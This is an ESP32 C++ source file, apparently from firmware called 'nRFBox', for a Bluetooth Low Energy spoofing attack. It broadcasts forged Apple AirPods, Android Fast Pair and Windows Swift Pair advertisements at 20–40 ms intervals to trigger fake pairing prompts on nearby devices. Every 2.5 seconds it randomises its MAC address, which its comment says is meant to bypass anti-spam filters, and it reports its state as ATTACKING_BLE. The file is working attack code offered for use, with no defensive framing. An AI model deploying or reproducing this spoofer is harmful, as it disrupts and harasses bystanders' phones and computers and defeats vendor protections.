#include "BleManager.h"
#include "System.h"
#include <esp_system.h> // for esp_base_mac_addr_set

BleManager& BleManager::getInstance() { 
    static BleManager i; 
    return i; 
}

BleManager::BleManager() : 
    _isRunning(false), 
    _pAdvertising(nullptr), 
    _packetsSent(0), 
    _currentType(BleSpoofType::APPLE_AIRPODS),
    _lastMacRotateTime(0)
{}

void BleManager::setup() { 
    // Init on demand
}

void BleManager::stop() { 
    if(_isRunning && _pAdvertising) { 
        _pAdvertising->stop(); 
        _isRunning = false; 
        BLEDevice::deinit(true);
    } 
}

void BleManager::startSpoof(BleSpoofType type) {
    stop(); 
    
    // Initial MAC random
    rotateMacAddress(); 
    
    BLEDevice::init("nRFBox"); 
    _pAdvertising = BLEDevice::getAdvertising(); 
    
    _currentType = type; 
    setPayload(type);
    
    _pAdvertising->setMinInterval(0x20); // 20ms
    _pAdvertising->setMaxInterval(0x40); // 40ms
    _pAdvertising->start(); 
    
    _isRunning = true;
    _lastMacRotateTime = millis();
}

// FIX v7.1: MAC Rotation to bypass anti-spam filters
void BleManager::rotateMacAddress() {
    uint8_t newMac[6];
    esp_fill_random(newMac, 6);
    
    // Set bits for Random Static Address
    // The two most significant bits of the address shall be equal to 1
    newMac[0] |= 0xC0; 
    
    // Set base MAC (changes BT MAC effectively)
    esp_base_mac_addr_set(newMac);
}

void BleManager::setPayload(BleSpoofType type) {
    BLEAdvertisementData ad; 
    std::string p;
    
    if (type == BleSpoofType::APPLE_AIRPODS) {
        char d[] = { 0x4C, 0x00, 0x07, 0x19, 0x01, 0x02, 0x20, 0x55, 0xAA, 0x01 }; 
        p.assign(d, sizeof(d)); 
        ad.setManufacturerData(p);
    } 
    else if (type == BleSpoofType::ANDROID_FASTPAIR) {
        ad.setServiceData(BLEUUID((uint16_t)0xFE2C), "\x00\x01\x02"); 
        ad.setFlags(0x06); 
    }
    else if (type == BleSpoofType::WINDOWS_SWIFT) {
        char d[] = { 0x06, 0x00, 0x03, 0x00, 0x80 }; 
        p.assign(d, sizeof(d)); 
        ad.setManufacturerData(p);
    }
    _pAdvertising->setAdvertisementData(ad);
}

static uint32_t lastBleLog = 0;

bool BleManager::loop(StatusMessage& out) {
    if(!_isRunning) { 
        out.state = SystemState::IDLE; 
        return false; 
    }
    out.state = SystemState::ATTACKING_BLE; 
    
    // 1. Stats
    if (millis() - lastBleLog > 100) {
        _packetsSent++; 
        lastBleLog = millis();
    }
    
    // 2. MAC Rotation Check (Every 2.5 seconds)
    if (millis() - _lastMacRotateTime > 2500) {
        _pAdvertising->stop();
        
        // Changing MAC requires restart of advertising
        // Note: esp_base_mac_addr_set usually requires restart, but for BLE randomization
        // we can sometimes get away with deinit/init or just relying on random addr type.
        // For stability in v7.1: We assume Random Address type is used.
        
        rotateMacAddress(); // Generate new base
        
        // Re-init advertising to pick up new address?
        // Actually, easiest is to just restart advertising which picks new Random addr if configured.
        // But esp_base_mac_addr_set forces it.
        
        _pAdvertising->start();
        _lastMacRotateTime = millis();
        // snprintf(out.logMsg, MAX_LOG_MSG, "MAC Rotated");
    }
    
    out.packetsSent = _packetsSent;
    snprintf(out.logMsg, MAX_LOG_MSG, "Spoofing...");
    
    return true;
}